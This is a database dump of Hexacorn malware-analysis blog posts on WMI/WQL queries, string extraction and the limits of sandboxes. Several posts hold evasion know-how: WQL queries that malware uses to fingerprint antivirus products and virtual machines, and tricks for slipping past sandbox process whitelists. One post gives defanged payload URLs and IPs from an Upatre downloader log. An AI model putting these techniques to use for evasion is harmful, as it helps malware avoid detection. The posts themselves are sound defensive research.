UserModeTime,\r\n        ParentProcessId\r\n     FROM\r\n        Win32_Process\r\n     WHERE\r\n        (  Caption = \"notepad.exe\")\nwhich is ran when we execute\ntaskkill.exe /im notepad.exe /f\nThe WMI is then queried for a method ‘Terminate’ which is supposed to kill the object. All of these queries are ran via COM so it’s a bit of a pain to analyze it, but once you get used to it it’s actually manageable (just a bit mundane).\nRefer to a short Taskkill.exe log below.\nAs I mentioned above, malware often uses WQL queries and the most popular are listed below:\n\nselect * from antispywareproduct\nselect * from antivirusproduct\nselect * from firewallproduct\nselect * from win32_baseboard\nselect * from win32_bios where manufacturer like ‘%xen%’ or (smbiosbiosversion like ‘%vbox%’) or (smbiosbiosversion like ‘%bochs%’) or (smbiosbiosversion like ‘%qemu%’) or (smbiosbiosversion like ‘%virtualbox%’)\nselect * from win32_bios\nselect * from win32_cdromdrive\nselect * from win32_computersystem\nselect * from win32_computersystemproduct\nselect * from win32_diskdrive\nselect * from win32_networkadapter where (name like ‘%tap%’) and (not pnpdeviceid like ‘%*isatap%’) and (netenabled = true)\nselect * from win32_onboarddevice\nselect * from win32_operatingsystem\nselect * from win32_physicalmedia\nselect * from win32_processor\nselect * from win32_systemenclosure\nselect * from win32_useraccount\nselect * from win32_videocontroller\nselect name, executablepath from win32_process\n\nThere are many more which often focus on sandbox detection, but I may cover them in a separate post.\nTaskkill.exe log\nIWbemLocator::ConnectServer: ‘root\\cimv2’\nIWbemServices::ExecQuery: (‘SELECT __PATH, ProcessId, CSName, Caption, SessionId, ThreadCount, WorkingSetSize, KernelModeTime, UserModeTime, ParentProcessId FROM Win32_Process WHERE (  Caption = “notepad.exe”)’)\nIWbemServices::GetObjectA: Win32_Process\nIWbemClassObject::GetMethod: Terminate\nTasklist.exe log\nWbemLocator::ConnectServer): \'root\\cimv2\'\r\nIWbemServices::ExecQuery (\'SELECT __PATH, ProcessId, CSName, Caption, SessionId, ThreadCount, WorkingSetSize, KernelModeTime, UserModeTime  FROM Win32_Process\')\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"0\"\r\nIWbemClassObject::Get: ProcessId=0\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=System Idle Process\r\nIWbemClassObject::Get: ThreadCount=1\r\nIWbemClassObject::Get: KernelModeTime=649121406250\r\nIWbemClassObject::Get: UserModeTime=0\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=28672\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"4\"\r\nIWbemClassObject::Get: ProcessId=4\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=System\r\nIWbemClassObject::Get: ThreadCount=48\r\nIWbemClassObject::Get: KernelModeTime=103437500\r\nIWbemClassObject::Get: UserModeTime=0\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=241664\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"412\"\r\nIWbemClassObject::Get: ProcessId=412\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=smss.exe\r\nIWbemClassObject::Get: ThreadCount=3\r\nIWbemClassObject::Get: KernelModeTime=156250\r\nIWbemClassObject::Get: UserModeTime=156250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=442368\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"628\"\r\nIWbemClassObject::Get: ProcessId=628\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=csrss.exe\r\nIWbemClassObject::Get: ThreadCount=11\r\nIWbemClassObject::Get: KernelModeTime=12343750\r\nIWbemClassObject::Get: UserModeTime=5312500\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=4444160\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"720\"\r\nIWbemClassObject::Get: ProcessId=720\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=winlogon.exe\r\nIWbemClassObject::Get: ThreadCount=17\r\nIWbemClassObject::Get: KernelModeTime=15156250\r\nIWbemClassObject::Get: UserModeTime=2343750\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=5029888\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"764\"\r\nIWbemClassObject::Get: ProcessId=764\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=services.exe\r\nIWbemClassObject::Get: ThreadCount=15\r\nIWbemClassObject::Get: KernelModeTime=8927500000\r\nIWbemClassObject::Get: UserModeTime=901250000\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=3727360\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"776\"\r\nIWbemClassObject::Get: ProcessId=776\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=lsass.exe\r\nIWbemClassObject::Get: ThreadCount=20\r\nIWbemClassObject::Get: KernelModeTime=143437500\r\nIWbemClassObject::Get: UserModeTime=28906250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=1490944\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"932\"\r\nIWbemClassObject::Get: ProcessId=932\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=vmacthlp.exe\r\nIWbemClassObject::Get: ThreadCount=1\r\nIWbemClassObject::Get: KernelModeTime=0\r\nIWbemClassObject::Get: UserModeTime=156250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=2768896\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"948\"\r\nIWbemClassObject::Get: ProcessId=948\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=svchost.exe\r\nIWbemClassObject::Get: ThreadCount=17\r\nIWbemClassObject::Get: KernelModeTime=781250\r\nIWbemClassObject::Get: UserModeTime=468750\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=5214208\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1032\"\r\nIWbemClassObject::Get: ProcessId=1032\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=svchost.exe\r\nIWbemClassObject::Get: ThreadCount=9\r\nIWbemClassObject::Get: KernelModeTime=625000\r\nIWbemClassObject::Get: UserModeTime=781250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=4546560\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1152\"\r\nIWbemClassObject::Get: ProcessId=1152\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=svchost.exe\r\nIWbemClassObject::Get: ThreadCount=49\r\nIWbemClassObject::Get: KernelModeTime=125937500\r\nIWbemClassObject::Get: UserModeTime=50781250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=17682432\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1188\"\r\nIWbemClassObject::Get: ProcessId=1188\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=svchost.exe\r\nIWbemClassObject::Get: ThreadCount=5\r\nIWbemClassObject::Get: KernelModeTime=781250\r\nIWbemClassObject::Get: UserModeTime=312500\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=3985408\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1224\"\r\nIWbemClassObject::Get: ProcessId=1224\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=svchost.exe\r\nIWbemClassObject::Get: ThreadCount=4\r\nIWbemClassObject::Get: KernelModeTime=0\r\nIWbemClassObject::Get: UserModeTime=156250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=3346432\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1396\"\r\nIWbemClassObject::Get: ProcessId=1396\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=spoolsv.exe\r\nIWbemClassObject::Get: ThreadCount=11\r\nIWbemClassObject::Get: KernelModeTime=625000\r\nIWbemClassObject::Get: UserModeTime=156250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=6545408\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1776\"\r\nIWbemClassObject::Get: ProcessId=1776\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=explorer.exe\r\nIWbemClassObject::Get: ThreadCount=10\r\nIWbemClassObject::Get: KernelModeTime=21718750\r\nIWbemClassObject::Get: UserModeTime=6093750\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=19316736\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"2008\"\r\nIWbemClassObject::Get: ProcessId=2008\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=vmtoolsd.exe\r\nIWbemClassObject::Get: ThreadCount=5\r\nIWbemClassObject::Get: KernelModeTime=17031250\r\nIWbemClassObject::Get: UserModeTime=8593750\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=12140544\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"2024\"\r\nIWbemClassObject::Get: ProcessId=2024\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=ctfmon.exe\r\nIWbemClassObject::Get: ThreadCount=1\r\nIWbemClassObject::Get: KernelModeTime=156250\r\nIWbemClassObject::Get: UserModeTime=312500\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=3600384\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"476\"\r\nIWbemClassObject::Get: ProcessId=476\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=PERSFW.exe\r\nIWbemClassObject::Get: ThreadCount=6\r\nIWbemClassObject::Get: KernelModeTime=2187500\r\nIWbemClassObject::Get: UserModeTime=1093750\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=6897664\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"516\"\r\nIWbemClassObject::Get: ProcessId=516\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=vmtoolsd.exe\r\nIWbemClassObject::Get: ThreadCount=7\r\nIWbemClassObject::Get: KernelModeTime=124531250\r\nIWbemClassObject::Get: UserModeTime=63281250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=13619200\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1472\"\r\nIWbemClassObject::Get: ProcessId=1472\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=TPAutoConnSvc.exe\r\nIWbemClassObject::Get: ThreadCount=5\r\nIWbemClassObject::Get: KernelModeTime=1093750\r\nIWbemClassObject::Get: UserModeTime=468750\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=4669440\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1796\"\r\nIWbemClassObject::Get: ProcessId=1796\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=TPAutoConnect.exe\r\nIWbemClassObject::Get: ThreadCount=1\r\nIWbemClassObject::Get: KernelModeTime=5312500\r\nIWbemClassObject::Get: UserModeTime=2500000\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=5267456\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"2040\"\r\nIWbemClassObject::Get: ProcessId=2040\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=cmd.exe\r\nIWbemClassObject::Get: ThreadCount=1\r\nIWbemClassObject::Get: KernelModeTime=156250\r\nIWbemClassObject::Get: UserModeTime=156250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=2961408\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"588\"\r\nIWbemClassObject::Get: ProcessId=588\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=wmiprvse.exe\r\nIWbemClassObject::Get: ThreadCount=7\r\nIWbemClassObject::Get: KernelModeTime=0\r\nIWbemClassObject::Get: UserModeTime=156250\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=6332416\r\nIWbemClassObject::Get: __PATH=\\\\<hostname>\\root\\cimv2:Win32_Process.Handle=\"1592\"\r\nIWbemClassObject::Get: ProcessId=1592\r\nIWbemClassObject::Get: CSName=<hostname>\r\nIWbemClassObject::Get: Caption=tasklist.exe\r\nIWbemClassObject::Get: ThreadCount=4\r\nIWbemClassObject::Get: KernelModeTime=2031250\r\nIWbemClassObject::Get: UserModeTime=2187500\r\nIWbemClassObject::Get: SessionId=0\r\nIWbemClassObject::Get: WorkingSetSize=5816320\n\n \nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2015/06/19/basic-intro-to-wmi-and-wql-queries/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (227, 'Permanent Link to Motu – yet another string extractor', 'Hexacorn', 'June 17, 2015 ', 'String extraction is a daily bread for many of us and there are many tools we can use. In the past I wrote a couple of them myself including:\n\nhexdive – extracts well-known strings\nhstrings – extracts localized strings\nPESectionExtractor.pl – extracts PE sections and their strings\n\nToday I am posting a simple proof of concept string extractor which I called motu. I came up with the name by looking for some fancy names for ‘an island’. According to wikipedia, motu is a reef islet formed by broken coral and sand, surrounding an atoll. If you google for motu you will find a lot of very picturesque photos.\nSo it’s a short name, and has some pretty pictures \nAnyway, back to the idea.\nAlgorithms extracting strings often work in a streaming FIFO fashion – data in, data out (if data meets criteria). I thought it would be interesting to extract strings first, do some internal crunching and output them as clusters.\nThe simple idea I came up with is to look at strings inside a file not as separate chunks, but parts of clusters which are a bit like islands (hence the motu :)) separated from each other. We read data from the file, if it looks like a printable string, we assign it to the current island. If the distance between the area where the string was taken from, and the place where we took the previous string from is significant (distance!), we treat the string as belonging to a new island. In other words, if we see a number of strings close to each other, we will output them. If the strings are sparse, or far away we don’t output them. In the end we only print islands that have at least N strings, and at least one string that contains [a-z]{length_of_the_string}. The latter is just to improve the output quality.\nThe pros are that you see much less junk strings [printable, but not really meaningful], the cons are that you will miss some strings. Still, it may be quicker to review the file outputted by motu than typical strings. In my tests I was getting various results – some very encouraging, some absolute rubbish.\nIn any case, I hope the idea can be taken further f.ex. having a list of seeds (known good strings taken either from histograms, or even from a dictionary) we could look for islands that contain these seeds only and output only ‘good’ islands instead of everything. The other idea could be to take all islands (including ones with just one string) and sort them by number of strings / island and output everything. This would ensure all strings are visible and the quality of what would be at the top of the output would be the highest (so one could eyeball the top of the resulting file carefully and pay less attention as we progress skimming through the rest of the file).\nYou can download script here. If you find any bugs, or have an idea for improvements, please let me know. Thanks.\nExamples:\n\nNotepad\n\nStrings (length = 4)\nvs\nmotu (length=4, distance=128, number of strings/island=at least 10)\n\n\nSome random Delphi sample\n\nStrings (length = 4)\nvs\nmotu (length=4, distance=128, number of strings/island=at least 10)\n\n\n\nShare this :)', 'Malware Analysis, motu, Software Releases', 'http://www.hexacorn.com/blog/2015/06/17/motu-yet-another-string-extractor/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (228, 'Permanent Link to Enter Sandbox – part 5: In search for Deus Ex Machina II', 'Hexacorn', 'June 17, 2015 ', 'My last post focused on limitations that are typically a result of ingenuity of software developers and malware authors. It is also a result of our inability to comprehend the vast number and a variety of files created en masse every day. Apart from evasions, these quirky productions are what is often limiting sandboxes’ ability to clearly distinguish what’s good and bad. But that’s not all.\nToday we will talk about limitations that are enforced by a sandbox running the best way it can. So well it does its job that it may lead malware to explore only a single path of execution – one that will prohibit other paths to be explored. A perfect example here is Upatre malware (I am talking about its slightly older versions from last year). When such Upatre sample is ran inside a sandbox it attempts to download a second part – the actual payload (e.g. Dyreza). To do so, it contacts a list of sites that host the payload. If one of the sites is down the malware will attempt to download from another. Usually, it stores 2-3 different URLs inside its body and would walk through them one by one in order to (attempt to) download the payload.\nSince most of sandboxes allow online connectivity (typically proxied/anonymized) a successful download of the payload from the first domain will lead to payload execution and other domains will never get accessed. Has the sample been executed offline, sandbox could observe attempts to download from more different domains. The result could be that all of them could get blacklisted, and the potential behavioral rule “downloads from more than one domain” could have triggered. Otherwise the behavior is no that different from a typical legitimate downloader.\nThe below example shows a log of connection attempts of one such Upatre sample running offline:\nInternetConnectW: 62[.]210[.]204[.]149:80\r\nHttpOpenRequestW: GET, /0912uk11/<hostname>/0/51-SP3/0/\r\nHttpOpenRequestW: GET, /0912uk11/<hostname>/1/0/0/\r\nInternetConnectW: coimbatoreholidays(.)com:80\r\nHttpOpenRequestW: GET, /images/viny11.pnd\r\nInternetConnectW: macintoshfilerecovery(.)biz:80\r\nHttpOpenRequestW: GET, /images/viny11.pnd\r\nInternetConnectW: coimbatoreholidays(.)com:80\r\nHttpOpenRequestW: GET, /images/viny11.pnd\r\nInternetConnectW: macintoshfilerecovery(.)biz:80\r\nHttpOpenRequestW: GET, /images/viny11.pnd\nAnd this is an excerpt from a behavioral log from VT:\nHTTP requests\r\nURL: hxxp://coimbatoreholidays(.)com/images/viny11.pnd\r\nTYPE: GET\r\nUSER AGENT: rupdate\r\nURL: hxxp://www(.)coimbatoreholidays(.)com/images/viny11.pnd\r\nTYPE: GET\r\nUSER AGENT: rupdate\r\nDNS requests\r\ncoimbatoreholidays(.)com (192[.]185[.]97[.]96)\r\nwww(.)coimbatoreholidays(.)com (192[.]185[.]97[.]96)\nThe macintoshfilerecovery(.)biz domain is not mentioned at all.\nInterestingly, the log from virscan.org shows both coimbatoreholidays and macintoshfilerecovery. It could be either that they test the sample offline, or the domain coimbatoreholidays.com died as a payload provider at the time the sample was tested.\nThis may lead us to the following conclusion: a good sandbox should test samples both online and offline.\nBut. Let’s remember that this is just one of many conditional layers.\nNowadays samples are executed on a variety of systems. Gone are days when you could just run it inside Windows XP and you would extract all the juice. Nowadays payloads include hybrid binaries targeting Windows XP, Windows 7, 32-bit and 64-bit platforms. That gives us 3 (xp 64 not included) OSs extra to cover at least. Windows 8.x is already out there for quite some time and Windows 10 is around the corner as well. They do have their quirks and some malware targeting them won’t work on older systems. With regards to XP – some samples compiled with modern compilers won’t even run on it anymore since their internal PE headers set a requirement for the OS to be at least Windows Vista/7 or newer (an example is JackPOS described by Josh in this post from Feb, 2014). Others simply statically link to APIs not present on older OS versions. And it’s often done w/o malicious purpose – people who write code often don’t even realize that they are breaking the compatibility with older OSses by simply using APIs that are introduced in newer OS versions (f.ex. ransomware is often linked with bcrypt.dll library that is not present on XP).\nBack to a discussion about what sandbox does so well – which is also its weakness.\nLogging in the sandbox is everything. And logging takes time. The more you hook/intercept, the more you see, but the slower it gets. No shortcuts here. Hook NT functions for .NET, Visual Basic application or Autoit executable, and you end up with gazillion of logs, malware not even partially executed and session ending w/o reaching the actual payload (let alone a proper decision about its ‘badness’). Hook and log a function that is executed 100000 for stalling purposes, and malware wins. And so on and so forth. One can extend a session time, but this is a naive concept. If you happen to log a wrong function, it will take forever to execute (examples include Visual Basic-based wrappers that do a lot of string operations before building a shellcode launching RunPE payload).\nIn other words: to log, or not to log is a really hard puzzle to crack.\nTake processes as an example: every new process spawn – add for monitoring (more logging to come). The problem is that it’s often not necessary. A sample spawning cmd.exe, net.exe, reg.exe to do some simple task is very common and hooking such processes doesn’t add any value to analysis. Quite the opposite, the logs grow exponentially and nothing good comes out of it. And for automated analysis it is a very difficult problem to handle.\nStill, should we monitor, or not?\nOne could build a whitelist of processes (or more precisely: processes and recognized command lines) one doesn’t want to monitor, but this is much harder than one may think and would probably immediately get exploited by malware authors who could leverage such non-monitored processes for some evasion purposes. With regards to troubles with building such a white list consider the following:\n\nadditional blank characters\nmultiple commands in one go (separated by ampersands, or using conditions)\nbatch files instead of command executed directly\npresence of file extensions in the command (or a lack of)\ncapitalization of letters that form the commands\nmultiple alternatives to do the same thing (del/erase, net/net1/sc, regedit/reg, copy/xcopy, etc.)\ncommands requiring command line switches can be shuffled around\ncommands executing processes only to run DDE commands (yes, it still happens  )\nprocesses launched using shell verbs and their variety\npaths used by the commands can be obfuscated and played around with in many ways (e.g. environmental variables, ‘/’ in paths work as a replacement for ‘\\’, substed paths, junctions, etc.)\nnew commands introduced with new OSes (cacls, xcacls, icacls, etc.)\n\nStill, it might be worth building a list of ‘safe’ non-monitored processes f.ex.\n\nnetsh firewall set allowedprogram …\nnet stop …\ntaskkill …\niexplore www_getwindowinfo\n\nOf course, to be useful, each command would require a dedicated parser or rules to extract juicy information for the high-level report.\nLast, but not least – the variety of problems sandboxes witness when they try to execute random samples and actually make them do something is a reason why a compensating approach a.k.a. yara rules or any other signature-based approach must be taken to ensure detection of ‘difficult cases’. I always refer to yara sigs as “poor man’s AV engine”. They are extremely handy, easy to write, but they do not scale well since each sig is a separate entity w/o any optimization and are extremely FP-prone since testing is typically done on a very limited sample set. Antivirus engines are doing the very same thing, but in a highly optimized fashion and with a much lower FP rate. Whether we like it or not sandbox needs to rely on signatures, or rule-based classification. Maybe it is what it is and perhaps a good sandbox needs to work like a good antivirus first.\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis', 'http://www.hexacorn.com/blog/2015/06/17/enter-sandbox-part-5-in-search-for-deus-ex-machina-ii/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (229, 'Permanent Link to Enter Sandbox – part 4: In search for Deus Ex Machina', 'Hexacorn', 'June 12, 2015 ', 'When we talk about sandboxing we can’t avoid talking about its limitations. The first thing that comes to our mind in this context is usually evasion (or evasions really since there are so many of them), but it’s actually not the most important part. The important (and depressing) part is that sandboxes are actually nearly identical with antivirus in many aspects. They share the very same, flawed concept of relying on a hope that detection of badness can be somehow codified. They are reactive even if it is masked under the depth of analysis they can provide and their ability to actually “see” what a given sample is doing. And mind you, I am not making a point here to bash on sandboxes (they are extremely useful), but about being _realistic_ with regards to what they can and cannot do. If you buy one, you need to make an informed decision.\nLet me explain.\nFirst, a bit of history. In 2007 or so I was responsible for processing large volumes of samples coming from a new, behavioral engine implemented by my employer at that time. My first reaction to this avalanche of suspicious files was that there is really a lot of crap out there that I would never imagine existed. I bet this is the first thought of anyone who ever had to deal with large quantities of samples and… it gets worse. These samples I was getting were samples that were already somehow _highlighted_ by the engine as suspicious.\nWho knows what else is out there.\nLet’s face it. There are gazillions of files out there that defy logic, assumptions, and fool your parsers and rules. And for any million of samples that you have just ‘covered’ by your new engine update there is another million of… people doing some weird stuff. They are either coding their legitimate apps in some very unique, creative way and coming up with some “clever” software choices, or intentionally trying to obfuscate and break stuff to make your life difficult (as a malware analyst, let alone automated systems).\nIt is one thing to sandbox a sample and see what it does [a.k.a. manually review the report], it is another to automatically decide whether it is good or bad. In my first attempts, I started looking for patterns on a file-level [static analysis]. Obviously, it didn’t go very far thanks to wrappers, protectors, and packers of any sort (often used by legitimate apps as well). I remember I went as far as implementing something that was a primitive version of a fuzzy file comparison based on specifically created rules for dedicated families (e.g. if the only difference between 2 files was just an URL, or small area of config, then my rule would calculate hash from the file excluding this area and then mark it as identical, if such hash was already ‘seen’). I later got a help from a very talented developer who took these ideas much further (he was a much better coder than I am) and he added a lot of interesting ‘detection’ features to the ‘samples sorting’ script, but at the end of the day we both felt that it was a pretty mundane work. Yes, it worked for many stupid installers and samples – and it does work even today, but it yet has to be proven as a reliable decision maker.\nStatic analysis on a file format level can’t take us very far. So I started running the samples in my own primitive sandbox and the resulting log was helping me to cherry-pick similar actions carried out by various samples. This definitely improved the ‘family’ or ‘outbreak’ detections and I can even claim some successes there, but it was not even close to be strong enough to clearly distinguish between good and evil. I was expanding on it further and further and started defining rules that would flag samples for further review. To give you an example: if CreateProcess/WriteProcessMemory/CreateRemoteThread happen then flag it as potentially bad (code injection). More and more rules, and more and more ambiguity.\nLike many clever researchers who constantly prove that AV is a piece of mierda, these samples were doing it to my efforts w/o any security-related research done. They were already out there, often for many years and it’s just the fact I have not seen it before made my life miserable, because I had to catch up. And catching up with all this requires a lot of resources.\nTo conclude: neither sandbox nor AV can provide enough insight (even if sandbox takes us further) to provide a good decision. Maybe it’s just that detecting bad stuff is really a terrible idea. While I am not the biggest fan of whitelisting, there are moments when I think that going totalitarian on all unapproved software and files is really the only way to go. Perhaps there is no room for democracy in security industry.\nSo, I spent a couple of paragraphs talking about limitations of sandbox that comes as a natural consequence of ingenuity of software developers (whether on a bad or good side of the fence, it doesn’t matter) and without mentioning a single evasion. Even if I didn’t think of it and would never admit it at that time, efficient sandboxing cannot co-exist w/o actually creating behavioral signatures the very same way as you do in your regular av work. Find the pattern, codify it, move on. That’s why I am now returning to state what I said earlier: sandboxes are actually nearly identical with antivirus in many aspects. Yes, they have some advantages, but it’s naive to see it as a solution to all the problems. It’s just yet another security control out there. And it is often bypassed – the funniest part is that is probably more often done incidentally and unpurposely than by relying on ‘anti-sandbox’ tricks. I will come back to this topic in the future.\nLots of babbling requires some specific examples to highlight the issues I was talking about:\n\nstatic analysis fail not only because of wrappers and protectors, but also because executable file properties are inspected during run-time and affecting them during run-time will lead to code paths that are established only when the code is actually running\ndynamic analysis is limited by the business logic of the application running; to date, most of it is an idiot logic relying on ‘get there fast asap’ and they do all the malicious stuff w/o much thinking; occasional evasions are just a distraction from a general trend\na couple of non-evasive ideas that break most of the sandboxes (and reversers ;)); these ideas are all parts of legitimate  software you can find everywhere:\n\ncommand line aguments\ngive an application any sense of interactivity and it fools every single sandbox on the planet\nusing any proprietary UI framework kills all autoclickers\nusing non-English language in your application will (with a few exceptions) instantly confuse any western reverser and also kill the autoclickers\nAPIs relying on ANSI code pages make life difficult if combined with the usage of non-English languages; guessing which ANSI code is used is not easy and requires a dedicated engine\nNon-latin alphabets is an instant kill to many reversers\nScripting languages are hard to cope with properly (monitoring native functions won’t help on such a high level) f.ex. AutoIt\nThere are legitimate cases for injecting data to a child process using memory writing functions (one is e.g. writing a copy of environment block to a child process’ memory)\nThere are gazillion versions of libraries used by software – they are often compiled from the very same (or slightly modified) source code, but with various options – hard to distinguish (in a generic way) whether they handle ANSI or Unicode; and attempts to intercept inline functions require dedicated signatures (note that compilation may turn them to many different forms e.g. optimized code /in many ways, depending on options/, targeting a specific processor, architecture, etc.), using various versions of the same compiler may also produce different results\n\n\n\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/06/12/enter-sandbox-part-4-in-search-for-deus-ex-machina/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (230, 'Permanent Link to Enter Sandbox – part 3: If you see Native code is creative', 'Hexacorn', 'June 10, 2015 ', 'Native functions are a very tempting target for monitoring as they are the core of the basic, atomic operations used by the OS. Observing them can give us a lot of juicy information about what is going on on the system + chances for evasions are low since most of the complex, high-level functions typically end up calling these OS ‘primitives’ anyway. Hooking/monitoring can be done both on kernel level (system-wide) and in user mode (process-wide); more exotic hooks can go deeper and monitor sysenter/syscall via Model Specific Registers (MSR), patch dispatcher functions e.g. KiFastCallEntry etc. – anything that participates in the transition between kernel and user mode can be monitored/patched/intercepted. There is also an extra layer for wow64 link between 32- and 64-bit layers inside 32-bit processes on 64-bit OS.\nAs I mentioned in the first part I am not a big fan of native functions hooking. More specifically, I do think it’s worth hooking these functions, but it is not necessary to always do so and there is also no need necessarily to output their logs into report all the time. The thing is that they are extremely noisy and they really lack of context. For the record, must emphasize here again that I am mainly focusing on manual analysis – the commercial sandbox should definitely look at everything and better be oversensitive and show more than ignore some important stuff.\nIf we look back at the list of APIs that I presented in part 1 and which are resolved using GetProcAddress you will notice that all of them are actually non-native APIs. They are just regular windows APIs.\nThere is a simple reason for it.\nMost of malware is written in high-level languages and they leverage frameworks using predefined, well-structured and easy to use libraries. The functions malware writers rely on are imported statically and since they often use a copy&pasted code the result is that similar stuff is populated in gazillions of malicious projects written in Delphi, VB, AutoIT, .NET, etc. etc. While some of the malware families do leverage native functions it is not that common. It is important to say that native functions are not that difficult to use – they are just not that convenient – who would like to bother with data alignments, undocumented structures, or using NtCreateFile if there is an easy way – f.ex. fopen, CreateFile, 